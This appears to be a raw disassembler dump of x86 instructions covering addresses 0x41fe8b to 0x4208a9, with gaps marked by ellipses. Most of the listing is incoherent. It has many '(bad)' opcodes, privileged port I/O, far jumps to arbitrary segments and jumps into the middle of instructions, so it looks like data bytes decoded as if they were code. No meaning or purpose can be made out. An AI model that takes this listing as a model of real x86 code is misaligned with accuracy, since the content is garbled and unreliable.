  41fe8b:	mov    ecx,0xb71f0972
  41fe90:	pop    esp
  41fe91:	ss pop ds
  41fe93:	mov    edx,0x33750053
  41fe98:	std    
  41fe99:	push   edx
  41fe9a:	mov    gs,WORD PTR [ebx]
  41fe9c:	bound  edx,QWORD PTR [ebx+0x72]
  41fe9f:	and    eax,0x77556573
  41fea4:	and    DWORD PTR [ebx+edi*2+0x5],esp
  41fea8:	bound  ebp,QWORD PTR [ebp+0x38]
  41feab:	sub    esp,DWORD PTR [edx+0x20]
  41feae:	push   ebx
  41feaf:	outs   dx,DWORD PTR cs:[esi]
  41feb1:	gs inc esp
  41feb3:	sub    ebp,DWORD PTR [edx+esi*2+0x3e]
  41feb7:	push   edi
  41feb8:	dec    edi
  41feb9:	imul   esi,ebx,0xe565503a
  41febf:	sub    DWORD PTR [edx+0x72],esp
  41fec2:	pop    es
  41fec3:	jnp    0x41ff29
  41fec5:	sub    eax,0x72622492
  41feca:	xlat   BYTE PTR ds:[ebx]
  41fecb:	add    al,0x66
  41fecd:	je     0x41fec1
  41fecf:	add    al,0x62
  41fed1:	jb     0x41fe64
  41fed3:	cmp    ch,BYTE PTR [edi+0x20]
  41fed6:	inc    edx
  41fed7:	cmp    ebp,DWORD PTR [edx]
  41fed9:	push   ebp
  41feda:	in     al,0x3a
  41fedc:	outs   dx,DWORD PTR ds:[esi]
  41fedd:	and    bh,al
  41fedf:	or     ch,bh
  41fee1:	and    al,0xd4
  41fee3:	add    ecx,DWORD PTR [eax+0x65]
  41fee6:	fidiv  WORD PTR [eiz*2+0x61]
	...
  41ff11:	add    BYTE PTR [eax],al
  41ff13:	add    BYTE PTR [esi-0x41ad02cf],ch
  41ff19:	sub    esp,DWORD PTR [edx+0x53]
  41ff1c:	ret    0x7325
  41ff1f:	gs cmc 
  41ff21:	ja     0x41ff44
  41ff23:	fs retf 
  41ff25:	add    al,0x43
  41ff27:	push   esp
  41ff28:	(bad)  
  41ff29:	push   edi
  41ff2a:	inc    esp
  41ff2b:	fld    TBYTE PTR gs:[edx]
  41ff2e:	jne    0x41ff95
  41ff30:	and    DWORD PTR [ebx],ecx
  41ff32:	dec    ebp
  41ff33:	add    ah,ah
  41ff35:	sub    eax,0x813e6571
  41ff3a:	sub    bh,BYTE PTR [eax-0x55]
  41ff3d:	pop    eax
  41ff3e:	add    al,0x55
  41ff40:	fwait
  41ff41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff42:	and    al,0x44
  41ff44:	lahf   
  41ff45:	push   eax
  41ff46:	jecxz  0x41ff47
  41ff48:	jne    0x41feeb
  41ff4a:	loope  0x41ffb2
  41ff4c:	test   al,0x64
  41ff4e:	rcr    BYTE PTR [esi-0x76],0x63
  41ff52:	add    al,0x51
  41ff54:	outs   dx,DWORD PTR ds:[esi]
  41ff55:	dec    eax
  41ff56:	jmp    0x41ffcb
  41ff58:	fwait
  41ff59:	and    al,0xdf
  41ff5b:	ins    BYTE PTR es:[edi],dx
  41ff5c:	ins    BYTE PTR es:[edi],dx
  41ff5d:	pop    ss
  41ff5e:	in     al,0x73
  41ff60:	push   ds
  41ff61:	aad    0x0
  41ff63:	je     0x41ffc4
  41ff65:	callw  0x3dcb
  41ff69:	sbb    al,0x1
  41ff6b:	daa    
  41ff6c:	ds and al,0x1
  41ff6f:	inc    ecx
  41ff70:	adc    edx,0xc36c53d5
  41ff76:	retf   
  41ff77:	dec    ebp
	...
  41ffa0:	add    BYTE PTR [eax],al
  41ffa2:	push   0x4
  41ffa4:	rcl    DWORD PTR [ecx+0x7],1
  41ffa7:	test   ebx,0xd0041751
  41ffad:	dec    ebp
  41ffae:	div    edx
  41ffb0:	iret   
  41ffb1:	inc    edx
  41ffb2:	(bad)
  41ffb6:	std    
  41ffb7:	mov    esp,0xd6014600
  41ffbc:	mov    edi,0xca0146
  41ffc1:	add    BYTE PTR [edx],dl
  41ffc3:	loope  0x41ffa6
  41ffc5:	callw  0xbd
  41ffc9:	ins    DWORD PTR es:[edi],dx
  41ffca:	in     al,dx
  41ffcb:	jmp    0x71ef:0xf8d866e1
  41ffd2:	rol    BYTE PTR [ebx],cl
  41ffd4:	icebp  
  41ffd5:	pop    esi
  41ffd6:	int    0x94
  41ffd8:	repnz ins BYTE PTR es:[edi],dx
  41ffda:	int3   
  41ffdb:	pop    edx
  41ffdc:	dec    ebx
  41ffdd:	(bad)  
  41ffdf:	jnp    0x42002c
  41ffe1:	out    dx,eax
  41ffe2:	fcomp  QWORD PTR [edx+0x5c]
  41ffe5:	cmc    
  41ffe6:	pushf  
  41ffe7:	lea    edi,ds:0x2680a4e3
  41ffed:	repnz mov BYTE PTR [edi-0x7fde20cc],al
  41fff4:	cmp    esi,esp
  41fff6:	push   edi
  41fff7:	dec    edx
  41fff8:	inc    BYTE PTR [ebx]
  41fffa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fffb:	(bad)  
  41fffc:	sbb    esi,esp
  41fffe:	inc    edi
  41ffff:	dec    edx
  420000:	into   
  420001:	add    edx,DWORD PTR [esi+0xf41b8f]
	...
  42002f:	add    BYTE PTR [esi+0x55],ch
  420032:	mov    esi,0x2eb73e28
  420037:	jmp    0xdf4d8296
  42003c:	test   DWORD PTR [esi-0x77950a01],ebx
  420042:	add    al,0x4
  420044:	jb     0x41ffe4
  420046:	iret   
  420047:	cmc    
  420048:	pop    edx
  420049:	mov    al,dl
  42004b:	out    dx,al
  42004c:	push   esp
  42004d:	pop    ebx
  42004e:	mov    bl,0xc4
  420050:	and    DWORD PTR [ebp-0x54e31942],ecx
  420056:	shr    esi,cl
  420058:	cs pop ebx
  42005a:	call   0xfe2:0xbe8f1be8
  420061:	or     BYTE PTR [ebx-0x6972e63c],0xe6
  420068:	sbb    al,0xab
  42006a:	mov    ebp,esi
  42006c:	push   cs
  42006d:	pop    ebx
  42006e:	mov    al,ds:0x888eeee9
  420073:	out    0xe5,eax
  420075:	mov    ecx,0x5aefeaab
  42007a:	fwait
  42007b:	(bad)
  42007e:	add    BYTE PTR [esp+eiz*2+0x69e96b8c],al
  420085:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420086:	addr16 dec edx
  420088:	pop    edx
  420089:	mov    ebp,DWORD PTR [ebp+0x4c]
  42008c:	popa   
  42008d:	sbb    DWORD PTR [ecx+0x2a],ebx
  420090:	daa    
  420091:	xchg   BYTE PTR [ebp+0x45],ch
	...
  4200bc:	add    BYTE PTR [eax],al
  4200be:	daa    
  4200bf:	sbb    DWORD PTR [ecx+0x1b],ebx
  4200c2:	pop    ss
  4200c3:	jl     0x42012e
  4200c5:	sub    al,0x1
  4200c7:	test   DWORD PTR [ecx+ebp*8+0xa],esi
  4200cb:	inc    esi
  4200cc:	dec    ebx
  4200cd:	inc    esp
  4200ce:	es jle 0x42013e
  4200d1:	pop    ss
  4200d2:	inc    edx
  4200d3:	mov    bh,0x49
  4200d5:	int3   
  4200d6:	clc    
  4200d7:	jge    0x420145
  4200d9:	or     al,0xe7
  4200db:	xchg   BYTE PTR [eax],al
  4200dd:	sub    eax,0xf6d8b0a
  4200e2:	aad    0x84
  4200e4:	arpl   dx,di
  4200e6:	cmp    eax,0xe300709c
  4200eb:	sbb    BYTE PTR [ecx+0x24],bl
  4200ee:	retf   0x6181
  4200f1:	lds    ecx,FWORD PTR [eax+0x3dca6788]
  4200f7:	stos   BYTE PTR es:[edi],al
  4200f8:	je     0x4200c2
  4200fa:	lahf   
  4200fb:	jle    0x420128
  4200fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200fe:	sub    DWORD PTR [eax-0x736b4600],0x8057ba63
  420108:	outs   dx,BYTE PTR ds:[esi]
  420109:	sar    BYTE PTR ds:0xa1c051b7,0x7d
  420110:	jno    0x4200fb
  420112:	jno    0x4200c2
  420114:	addr16 call 0xa41d:0x846d7b94
  42011c:	arpl   WORD PTR [ebp+0xb964],ax
	...
  42014a:	add    BYTE PTR [eax],al
  42014c:	xchg   ecx,eax
  42014d:	cli    
  42014e:	jo     0x4201c0
  420150:	push   edi
  420151:	das    
  420152:	std    
  420153:	fs addr16 or ch,bh
  420157:	jae    0x4201c0
  420159:	add    eax,0x39576dfd
  42015e:	std    
  42015f:	jb     0x4201b8
  420161:	pop    esp
  420162:	add    BYTE PTR [eax+ebp*2+0x3],bl
  420166:	ins    BYTE PTR es:[edi],dx
  420167:	bound  eax,QWORD PTR [esi-0x6fbbe2fd]
  42016d:	or     BYTE PTR [ebx+0x6c],ch
  420170:	jo     0x420170
  420172:	pusha  
  420173:	gs push ebp
  420175:	pop    edi
  420176:	dec    edi
  420177:	dec    ebp
  420178:	adc    edi,edi
  42017a:	outs   dx,BYTE PTR ds:[esi]
  42017b:	arpl   WORD PTR [edi],bp
  42017d:	pop    edi
  42017e:	inc    esi
  42017f:	jb     0x4201bb
  420181:	or     al,0x65
  420183:	inc    esi
  420184:	cmp    ebp,DWORD PTR [edi]
  420186:	std    
  420187:	sub    eax,0x432234
  42018c:	adc    eax,0x3a7a5e03
  420191:	fnstenv [eax+0x70]
  420194:	out    0xc,eax
  420196:	data16 je 0x4201d3
  420199:	inc    ecx
  42019a:	fs popa 
  42019c:	jmp    0x4201f9
  42019e:	dec    esp
  42019f:	popa   
  4201a0:	in     al,0x7
  4201a2:	dec    ebp
  4201a3:	popa   
  4201a4:	xchg   esp,eax
  4201a5:	or     al,0x74
  4201a7:	outs   dx,DWORD PTR ds:[esi]
  4201a8:	xchg   ebp,eax
  4201a9:	aaa    
  4201aa:	std    
  4201ab:	dec    ebx
  4201ac:	jbe    0x4201ba
  4201ae:	jno    0x4201f1
	...
  4201d8:	add    BYTE PTR [eax],al
  4201da:	jnp    0x420213
  4201dc:	outs   dx,DWORD PTR ds:[esi]
  4201dd:	gs aam 0xc
  4201e0:	std    
  4201e1:	dec    ebx
  4201e2:	xchg   BYTE PTR [ecx+esi*2],cl
  4201e5:	push   ebp
  4201e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201e7:	cli    
  4201e8:	outs   dx,BYTE PTR ds:[esi]
  4201e9:	add    bl,dl
  4201eb:	(bad)  
  4201ec:	outs   dx,DWORD PTR ds:[esi]
  4201ed:	je     0x42022d
  4201ef:	shl    ch,cl
  4201f1:	jno    0x4201dd
  4201f3:	add    edx,edx
  4201f5:	ins    BYTE PTR es:[edi],dx
  4201f6:	loopne 0x42018d
  4201f8:	out    dx,al
  4201f9:	pop    esi
  4201fa:	in     al,dx
  4201fb:	(bad)  
  4201fd:	inc    ebp
  4201fe:	jmp    0xe3de:0xee67f1e2
  420205:	push   0x5ee843ea
  42020a:	les    ebx,FWORD PTR [esi+0x50ae73be]
  420210:	shl    DWORD PTR [edx-0x56],1
  420213:	mov    al,0xeb
  420215:	ins    DWORD PTR es:[edi],dx
  420216:	mov    eax,ds:0x7c5c0451
  42021b:	test   al,0xe3
  42021d:	jns    0x4201c2
  42021f:	inc    esi
  420220:	lock outs dx,DWORD PTR ds:[esi]
  420222:	ds push ss
  420224:	fld    TBYTE PTR [edi-0x66]
  420227:	add    al,0xbb
  420229:	push   ebx
  42022a:	outs   dx,BYTE PTR ds:[esi]
  42022b:	sub    DWORD PTR [edx],ebp
  42022d:	mov    bl,BYTE PTR cs:[ebx-0x1a]
  420231:	push   0x62ec7192
  420236:	pop    edx
  420237:	jo     0x420211
  420239:	ins    BYTE PTR es:[edi],dx
  42023a:	outs   dx,BYTE PTR ds:[esi]
  42023b:	pop    edi
  42023c:	out    0x5b,al
	...
  420266:	add    BYTE PTR [eax],al
  420268:	pop    ebp
  420269:	pop    ebp
  42026a:	out    0x6a,eax
  42026c:	pop    edi
  42026d:	push   ss
  42026e:	(bad)  
  420270:	sub    BYTE PTR ds:0x46e53bb,0xc2
  420277:	ins    BYTE PTR es:[edi],dx
  420278:	sub    BYTE PTR [esi],bl
  42027a:	loopne 0x4202dc
  42027c:	sub    bl,BYTE PTR [ebx]
  42027e:	out    0x6d,al
  420280:	sub    eax,0x2a77f06e
  420285:	add    al,0x32
  420287:	inc    esp
  420288:	imul   eax,esi,0xffffffcc
  42028b:	dec    edi
  42028c:	ds shr ebx,1
  42028f:	jae    0x4202b4
  420291:	pop    ebx
  420292:	call   0x1a03:0x90851925
  420299:	dec    edx
  42029a:	stos   DWORD PTR es:[edi],eax
  42029b:	sub    al,bh
  42029d:	scas   al,BYTE PTR es:[edi]
  42029e:	mov    bh,0x3
  4202a0:	or     ch,BYTE PTR [edx-0x61231070]
  4202a6:	test   dl,dh
  4202a8:	loopne 0x420327
  4202aa:	test   eax,esp
  4202ac:	iret   
  4202ad:	pop    edx
  4202ae:	call   0xefc3:0x3eaf03c6
  4202b5:	lahf   
  4202b6:	cmp    eax,ecx
  4202b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202b9:	jl     0x420315
  4202bb:	icebp  
  4202bc:	pushf  
  4202bd:	mov    ch,BYTE PTR [ebx]
  4202bf:	shl    BYTE PTR [eax-0x6737b375],1
  4202c5:	jns    0x4202e2
  4202c7:	stc    
  4202c8:	adc    DWORD PTR [edi+esi*8+0x2f],0x0
	...
  4202f5:	add    BYTE PTR [edi-0x66],cl
  4202f8:	out    dx,eax
  4202f9:	cmp    edx,DWORD PTR [ebp-0x63]
  4202fc:	fnstsw WORD PTR [ebp+0x33d8484f]
  420302:	sub    DWORD PTR [esp+eax*8-0x2f65d13e],ebx
  420309:	es cs push ebx
  42030c:	mov    bh,0x33
  42030e:	sub    al,0x99
  420310:	mov    ecx,0x2d540dbd
  420315:	ret    0xb754
  420318:	mov    eax,0x17b70c25
  42031d:	fmul   DWORD PTR [edx-0x7c]
  420320:	int    0x30
  420322:	ins    BYTE PTR es:[edi],dx
  420323:	pop    ebx
  420324:	lods   al,BYTE PTR ds:[esi]
  420325:	loop   0x420355
  420327:	xchg   esp,eax
  420328:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420329:	iret   
  42032a:	stc    
  42032b:	pop    edx
  42032c:	mov    ds:0x9a8f1cc5,eax
  420331:	loop   0x420342
  420333:	jl     0x420335
  420335:	(bad)  
  420336:	jb     0x42034d
  420338:	sub    esi,DWORD PTR [ecx-0x28ff7a95]
  42033e:	(bad)  
  42033f:	jns    0x4203b1
  420341:	jmp    0xa4949bcf
  420346:	mov    gs,WORD PTR [ebx+0x5b17be56]
  42034c:	jo     0x4202d6
  42034e:	outs   dx,BYTE PTR ds:[esi]
  42034f:	mov    dh,BYTE PTR [ebp-0x72]
  420352:	dec    edi
  420353:	jns    0x420375
  420355:	mov    esp,0xb362510c
	...
  420382:	add    BYTE PTR [eax],al
  420384:	cmp    eax,0x4c4c718a
  420389:	xchg   DWORD PTR [edi+0x4c],ebx
  42038c:	sbb    DWORD PTR [ebx+0x71],edx
  42038f:	adc    edi,DWORD PTR [edx]
  420391:	jge    0x420406
  420393:	cmp    eax,0x4d5f7516
  420398:	push   ds
  420399:	mov    esp,DWORD PTR [ebx+0x3a]
  42039c:	rcpps  xmm6,XMMWORD PTR [ecx-0xd]
  4203a0:	cmp    eax,0xc9150045
  4203a5:	stos   BYTE PTR es:[edi],al
  4203a6:	dec    ebx
  4203a7:	cmp    ch,ah
  4203a9:	scas   al,BYTE PTR es:[edi]
  4203aa:	sub    eax,0x50a8bbe9
  4203af:	leave  
  4203b0:	sti    
  4203b1:	xchg   DWORD PTR [ebp-0x17],esi
  4203b4:	stos   DWORD PTR es:[edi],eax
  4203b5:	test   al,0x50
  4203b7:	aaa    
  4203b8:	fisttp DWORD PTR [edi-0x771b0600]
  4203be:	arpl   dx,di
  4203c0:	sbb    edx,DWORD PTR [ebx-0x55c20295]
  4203c6:	dec    ebp
  4203c7:	scas   eax,DWORD PTR es:[edi]
  4203c8:	icebp  
  4203c9:	scas   eax,DWORD PTR es:[edi]
  4203ca:	aas    
  4203cb:	mov    ebx,0xc652b0f8
  4203d0:	lahf   
  4203d1:	xchg   DWORD PTR [ebx],ebp
  4203d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203d4:	jns    0x42037a
  4203d6:	and    BYTE PTR [eax],al
  4203d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203d9:	xor    ebx,DWORD PTR ds:[esp+esi*4-0x5]
  4203de:	outs   dx,BYTE PTR ds:[esi]
  4203df:	imul   edx,edi,0xa4007004
  4203e5:	pop    ds
  4203e6:	inc    ebx
  4203e7:	push   esp
	...
  420410:	add    BYTE PTR [eax],al
  420412:	rcr    BYTE PTR [ecx],0x4f
  420415:	inc    ebp
  420416:	mov    ebx,0xb8626c2a
  42041b:	cmp    eax,0x38a75446
  420420:	das    
  420421:	mov    al,cs:0xb754432c
  420427:	sub    esp,DWORD PTR [edx+0x72]
  42042a:	shl    DWORD PTR [edi+ebp*2],1
  42042d:	jae    0x420486
  42042f:	(bad)  
  420430:	push   eax
  420431:	push   eax
  420432:	aaa    
  420433:	sbb    al,0x6c
  420435:	jne    0x4203c0
  420437:	adc    edi,ebp
  420439:	inc    ebp
  42043a:	jae    0x42046b
  42043c:	sbb    eax,0x61fb7e46
  420441:	and    eax,0x61505f73
  420446:	push   esp
  420447:	or     al,0x74
  420449:	outs   dx,DWORD PTR ds:[esi]
  42044a:	push   ebp
  42044b:	add    edi,ebp
  42044d:	push   edx
  42044e:	or     BYTE PTR ds:0x19256573,0x5e
  420455:	ins    DWORD PTR es:[edi],dx
  420456:	inc    edx
  420457:	pop    edi
  420458:	push   ecx
  420459:	jae    0x42049d
  42045b:	or     eax,0xd6d74446
  420460:	push   0x69
  420462:	jecxz  0x42049a
  420464:	pop    esi
  420465:	ins    BYTE PTR es:[edi],dx
  420466:	and    esi,DWORD PTR [esi]
  420468:	outs   dx,DWORD PTR ds:[esi]
  420469:	gs inc esp
  42046b:	adc    ebp,DWORD PTR [edx+esi*2-0x32]
  42046f:	push   edi
  420470:	push   eax
  420471:	outs   dx,DWORD PTR ds:[esi]
  420472:	in     eax,0xb
  420474:	dec    ebx
  420475:	jne    0x420477
	...
  42049f:	add    BYTE PTR [edx+0x3e7261fd],cl
  4204a5:	add    dl,dh
  4204a7:	bound  ebp,QWORD PTR [esp+ebp*1]
  4204aa:	call   0xf15d0f20
  4204af:	bound  edi,QWORD PTR [esi]
  4204b1:	xor    al,BYTE PTR [ecx]
  4204b3:	add    BYTE PTR [esi],bh
  4204b5:	(bad)  
  4204b6:	fdivr  DWORD PTR [esi]
  4204b8:	ds sbb al,ch
  4204bb:	mov    es,WORD PTR [ebx]
  4204bd:	or     ecx,0x4b
  4204c0:	sub    DWORD PTR [ebx+ecx*2+0x67699e05],ebp
  4204c7:	shl    eax,1
  4204c9:	test   bl,0xff
  4204cc:	das    
  4204cd:	sub    al,0x38
  4204cf:	cs or  al,0x1b
  4204d2:	pop    ds
  4204d3:	xor    DWORD PTR [ecx],ecx
  4204d5:	add    dh,BYTE PTR [ecx]
  4204d7:	or     al,BYTE PTR [eax-0x6]
  4204da:	sbb    eax,0x8073f06
  4204df:	add    eax,0x5101053d
  4204e4:	mov    eax,ds:0x9f74f8a2
  4204e9:	mov    dh,0xe7
  4204eb:	pop    ebx
  4204ec:	jb     0x420499
  4204ee:	loop   0x42054e
  4204f0:	lea    edi,[edx]
  4204f2:	fmul   DWORD PTR [edi+0x72]
  4204f5:	jne    0x4204d2
  4204f7:	jae    0x42049c
  4204f9:	fs mov edi,0xe963905e
  4204ff:	bound  ebp,QWORD PTR [esp+eax*1-0x47]
  420503:	ins    BYTE PTR es:[edi],dx
	...
  42052c:	add    BYTE PTR [eax],al
  42052e:	ins    DWORD PTR es:[edi],dx
  42052f:	jo     0x420535
  420531:	push   ebx
  420532:	ins    DWORD PTR es:[edi],dx
  420533:	push   edi
  420534:	idiv   bh
  420536:	jno    0x42059b
  420538:	cmc    
  420539:	jo     0x420579
  42053b:	je     0x42051e
  42053d:	jno    0x420589
  42053f:	add    al,0xd3
  420541:	bound  ebx,QWORD PTR [ebx+0x11]
  420544:	cmc    
  420545:	bound  ebx,QWORD PTR [esi]
  420547:	pop    ebx
  420548:	stos   DWORD PTR es:[edi],eax
  420549:	fsubr  QWORD PTR [edi]
  42054b:	pop    ebx
  42054c:	mov    ebx,0xcc7d28c6
  420551:	cmc    
  420552:	sbb    eax,0xa1deca88
  420557:	inc    eax
  420558:	retf   
  420559:	clc    
  42055a:	push   ds
  42055b:	xchg   bh,ah
  42055d:	clc    
  42055e:	push   cs
  42055f:	js     0x42051a
  420561:	and    DWORD PTR [edi],ebx
  420563:	cmp    BYTE PTR [ebp-0x1885e717],0x2f
  42056a:	out    dx,eax
  42056b:	ja     0x420500
  42056d:	neg    eax
  42056f:	or     BYTE PTR [esi+0x7c7bd823],0xe8
  420576:	and    al,0x3d
  420578:	out    0x25,eax
  42057a:	mov    DWORD PTR ds:[eax-0x4b883321],ecx
  420581:	and    eax,0xe97eae3e
  420586:	int    0x89
  420588:	dec    eax
  420589:	neg    BYTE PTR [edi+ebp*4-0x7d5b24c6]
  420590:	inc    ebp
  420591:	fadd   DWORD PTR [eax]
	...
  4205bb:	add    BYTE PTR [eax-0x6b1cc079],cl
  4205c1:	scas   eax,DWORD PTR es:[edi]
  4205c2:	pop    ss
  4205c3:	imul   DWORD PTR [ebp-0x59]
  4205c6:	and    al,dl
  4205c8:	outs   dx,BYTE PTR ds:[esi]
  4205c9:	js     0x420605
  4205cb:	cmc    
  4205cc:	mov    al,ds:0x1f53d82
  4205d1:	call   0xdf08:0xa16df516
  4205d8:	pop    esp
  4205d9:	pop    ebx
  4205da:	cmp    al,0xf5
  4205dc:	pop    esp
  4205dd:	lea    ebx,ds:0xe77854e3
  4205e3:	sar    DWORD PTR [eax-0x72],cl
  4205e6:	cli    
  4205e7:	clc    
  4205e8:	bound  ecx,QWORD PTR [ebp-0x54bdf300]
  4205ee:	ins    DWORD PTR es:[edi],dx
  4205ef:	sti    
  4205f0:	leave  
  4205f1:	lahf   
  4205f2:	jae    0x4205c8
  4205f4:	mov    ds:0x89e9727c,eax
  4205f9:	jl     0x42066d
  4205fb:	les    eax,FWORD PTR [edi+edi*2-0x777642a1]
  420602:	jo     0x4205d0
  420604:	cmp    eax,0x87b970a1
  420609:	lods   eax,DWORD PTR ds:[esi]
  42060a:	push   eax
  42060b:	pop    es
  42060c:	call   0x6d9f:0x71e96c84
  420613:	popf   
  420614:	pusha  
  420615:	sbb    DWORD PTR [edi-0x7b],0xba004452
  42061c:	pop    esi
  42061d:	ja     0x420693
  42061f:	xchg   esi,eax
	...
  420648:	add    BYTE PTR [eax],al
  42064a:	pop    esp
  42064b:	mov    esp,DWORD PTR [ebx-0x5b]
  42064e:	cmp    BYTE PTR [esi+0x66],0x87
  420652:	pop    eax
  420653:	jl     0x420696
  420655:	jl     0x4206a4
  420657:	jno    0x4206aa
  420659:	jle    0x4206b2
  42065b:	lea    esi,[ebp+0x48]
  42065e:	xor    BYTE PTR [esi+0x0],bh
  420661:	daa    
  420662:	push   ss
  420663:	mov    eax,ds:0x8c214d20
  420668:	je     0x4206aa
  42066a:	sbb    al,0xb2
  42066c:	je     0x4206be
  42066e:	pop    ds
  42066f:	jg     0x420691
  420671:	cmp    bl,BYTE PTR [ecx]
  420673:	mov    esi,DWORD PTR [esi+0x4c]
  420676:	adc    BYTE PTR [ecx],dl
  420678:	inc    ebx
  420679:	adc    eax,0xc6470ea
  42067e:	repz mov WORD PTR [edi+0xf],fs
  420682:	fisttp QWORD PTR [edi+eiz*2+0x7370dc06]
  420689:	sbb    bl,cl
  42068b:	mov    al,BYTE PTR [eax]
  42068d:	add    BYTE PTR [ecx],ch
  42068f:	xor    ecx,DWORD PTR [ebp+0x20]
  420692:	cmp    edi,eax
  420694:	outs   dx,DWORD PTR ds:[esi]
  420695:	je     0x4206d5
  420697:	std    
  420698:	pop    ebp
  420699:	je     0x4206d9
  42069b:	cli    
  42069c:	push   0x20
  42069e:	xchg   edi,eax
  42069f:	std    
  4206a0:	outs   dx,DWORD PTR ds:[esi]
  4206a1:	jae    0x42062b
  4206a3:	sti    
  4206a4:	outs   dx,BYTE PTR ds:[esi]
  4206a5:	fs xchg edi,eax
  4206a7:	and    dl,BYTE PTR [ecx+0x50]
  4206aa:	aaa    
  4206ab:	add    esp,DWORD PTR [edx+0x73]
	...
  4206d6:	add    BYTE PTR [eax],al
  4206d8:	(bad)  ds:0x35cb616b
  4206de:	ins    BYTE PTR es:[edi],dx
  4206df:	outs   dx,BYTE PTR ds:[esi]
  4206e0:	aaa    
  4206e1:	pop    es
  4206e2:	ins    BYTE PTR es:[edi],dx
  4206e3:	jb     0x4206b0
  4206e5:	pop    esp
  4206e6:	inc    esi
  4206e7:	push   esp
  4206e8:	mov    bh,0x3c
  4206ea:	fs gs aam 0x8
  4206ee:	data16 outs dx,BYTE PTR ds:[esi]
  4206f0:	mov    dh,0x8
  4206f2:	outs   dx,WORD PTR ds:[esi]
  4206f4:	loope  0x420731
  4206f6:	pop    edi
  4206f7:	popa   
  4206f8:	(bad)  
  4206fa:	push   0x465cb86f
  4206ff:	push   esp
  420700:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420701:	cmp    al,0x70
  420703:	jb     0x4206c5
  420705:	add    DWORD PTR [esi+0x6c],esp
  420708:	mov    cl,BYTE PTR [edi*8+0x50276b45]
  42070f:	push   0x68fb7a
  420714:	jns    0x420729
  420716:	ins    DWORD PTR es:[edi],dx
  420717:	jae    0x420788
  420719:	add    ch,BYTE PTR [ecx+0x6c]
  42071c:	inc    ecx
  42071d:	stc    
  42071e:	outs   dx,DWORD PTR ds:[esi]
  42071f:	imul   edx,DWORD PTR [edi],0x4b666c2d
  420725:	or     BYTE PTR [esi+0x72],bl
  420728:	dec    edx
  420729:	sub    ecx,DWORD PTR [edx+0x41]
  42072c:	xor    al,0x3a
  42072e:	dec    edi
  42072f:	outs   dx,DWORD PTR ds:[esi]
  420730:	ds pusha 
  420732:	clc    
  420733:	pop    ebx
  420734:	js     0x42077c
  420736:	aam    0x46
  420738:	push   0x5bdd60
	...
  420765:	add    BYTE PTR [ebp+0x57],ch
  420768:	clc    
  420769:	jb     0x4207b9
  42076b:	add    al,ch
  42076d:	pop    esi
  42076e:	dec    edx
  42076f:	arpl   ax,cx
  420771:	data16 sub al,0x2
  420774:	int    0x45
  420776:	or     dl,dl
  420778:	mov    ebx,0x119206d
  42077d:	push   ecx
  42077e:	sbb    esi,DWORD PTR [ebx+esi*8]
  420781:	bound  ecx,QWORD PTR [esi+eax*8]
  420784:	(bad)  [eax+0xa]
  420787:	pusha  
  420788:	in     al,dx
  420789:	push   0x1a
  42078b:	add    bh,BYTE PTR [ebx-0xe38f99e]
  420791:	inc    ebp
  420792:	out    0xe5,eax
  420794:	out    0xff,eax
  420796:	frstpm(287 only) 
  420798:	lock jo 0x420772
  42079b:	in     eax,dx
  42079c:	out    0x2d,eax
  42079e:	xlat   BYTE PTR ds:[ebx]
  42079f:	(bad)  
  4207a0:	fdiv   st(7),st
  4207a2:	add    esp,ebx
  4207a4:	icebp  
  4207a5:	jae    0x420794
  4207a7:	test   esi,ebx
  4207a9:	ins    DWORD PTR es:[edi],dx
  4207aa:	jecxz  0x4207cd
  4207ac:	mov    edi,0xf288d171
  4207b1:	bound  ebp,QWORD PTR [esp+eax*1+0x408e53c3]
  4207b8:	(bad)  [eax-0x4e]
  4207bb:	push   esi
  4207bc:	call   0xbf824622
  4207c1:	pop    esi
  4207c2:	mov    gs,WORD PTR [eax+0x478a50e7]
  4207c8:	call   0x420833
	...
  4207f1:	add    BYTE PTR [eax],al
  4207f3:	add    BYTE PTR [ecx-0x73983e98],bl
  4207f9:	dec    ebp
  4207fa:	fbld   TBYTE PTR [edx-0x72]
  4207fd:	pop    ebx
  4207fe:	adc    edi,ecx
  420800:	outs   dx,BYTE PTR ds:[esi]
  420801:	pop    ebx
  420802:	cmp    bl,bh
  420804:	arpl   WORD PTR [edi+0x786fe51e],ax
  42080a:	sub    edi,DWORD PTR [esi+0x24167a60]
  420810:	test   DWORD PTR [edx+edx*1+0x24],edi
  420814:	jg     0x420894
  420816:	add    al,0xf4
  420818:	dec    esp
  420819:	xchg   DWORD PTR [eax],eax
  42081b:	fisub  WORD PTR [edx]
  42081d:	scas   eax,DWORD PTR es:[edi]
  42081e:	mov    esi,0xd0b123dc
  420823:	repz add eax,0xa1d3bb95
  420829:	test   eax,0x860de5be
  42082e:	enter  0x1cf1,0xaf
  420832:	lods   eax,DWORD PTR ds:[esi]
  420833:	fcomp  QWORD PTR [esi]
  420835:	jle    0x42083e
  420837:	shl    eax,0x81
  42083a:	pop    es
  42083b:	ret    
  42083c:	jmp    0x8d83:0xedf8977f
  420843:	out    0x5,al
  420845:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420846:	sbb    ch,0x7
  420849:	test   BYTE PTR [edi+0x7c88e4cf],dl
  42084f:	iret   
  420850:	out    0x7d,eax
  420852:	mov    edx,esi
  420854:	dec    ecx
  420855:	test   eax,0xf780
	...
  420882:	fcomp  QWORD PTR [edx-0x6c]
  420885:	repnz pushf 
  420887:	mov    DWORD PTR [eax],esi
  420889:	enter  0x8631,0x45
  42088d:	loopne 0x420817
  42088f:	jbe    0x4208eb
  420891:	add    al,0x8e
  420893:	jle    0x4208ee
  420895:	clc    
  420896:	sbb    DWORD PTR [eax+0x789de056],ebx
  42089c:	cmp    DWORD PTR [eax+ebx*2],eax
  42089f:	xchg   BYTE PTR [eax],al
  4208a1:	inc    ebx
  4208a2:	sbb    BYTE PTR [esi],cl
  4208a4:	jbe    0x4208e6
  4208a6:	sbb    BYTE PTR [ecx+0x78],bh
  4208a9:	in     al,0x1f
